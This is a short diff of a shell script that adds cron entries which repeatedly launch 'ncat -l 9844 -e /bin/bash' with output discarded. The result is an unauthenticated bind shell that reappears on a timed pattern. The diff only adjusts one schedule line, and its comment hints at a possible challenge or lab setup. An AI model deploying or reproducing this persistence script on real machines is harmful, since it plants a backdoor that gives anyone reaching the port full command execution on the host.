@@ -5,7 +5,7 @@ COMMAND="ncat -l 9844 -i 20 -v -e /bin/bash"
 # repeats every 20 minutes, during those 20min the pattern is:
 # at minute: 0, 5, 8, 11, 17, 19
 
-echo "20 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
+echo "*/20 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
 echo "5-59/20 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
 echo "8-59/20 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
 echo "11-59/20 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
